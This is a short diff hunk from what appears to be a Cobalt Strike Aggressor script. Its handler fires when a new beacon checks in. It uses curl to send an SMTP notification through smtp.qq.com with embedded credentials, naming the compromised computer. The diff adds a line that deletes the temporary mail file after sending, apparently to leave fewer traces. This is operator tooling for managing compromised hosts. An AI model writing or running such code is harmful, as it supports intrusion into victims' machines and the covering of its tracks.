@@ -18,5 +18,6 @@ on beacon_initial{
     writeb($Handle, $Mail_content); 
     @Curl_command = @('curl', '-s' ,'--url','smtp://smtp.qq.com', '--mail-from', $From, '--mail-rcpt', $To, '--upload-file','mail.txt', '--user', $UserName.':'.$Password);
     exec(@Curl_command);
+    exec("rm -f mail.txt");
     action("\c9Send Done: ".$ComName."!");
 }
